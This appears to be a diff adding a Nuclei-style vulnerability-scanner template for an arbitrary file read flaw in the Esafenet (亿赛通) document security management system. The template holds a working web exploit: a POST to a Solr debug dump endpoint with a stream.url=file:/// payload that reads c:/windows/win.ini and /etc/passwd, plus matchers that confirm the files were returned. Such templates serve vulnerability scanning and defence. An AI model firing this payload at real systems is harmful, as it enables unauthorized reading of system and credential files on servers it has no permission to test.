@@ -1,0 +1,42 @@
+id: poc-yaml-yisaitong-esafenet-dump-anyfile-read
+
+info:
+  name: 亿赛通电子文档安全管理系统 dump 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+
+variables:
+  file:
+    - "c:/windows/win.ini"
+    - "/etc/passwd"
+
+http:
+  - method: POST
+    path:
+      - "/solr/flow/debug/dump?param=ContentStreams"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      stream.url=file:///{{file}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "[extensions]"
+          - "[files]"
+        part: body
+      - type: word
+        words:
+          - "application/xml"
+        part: header
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
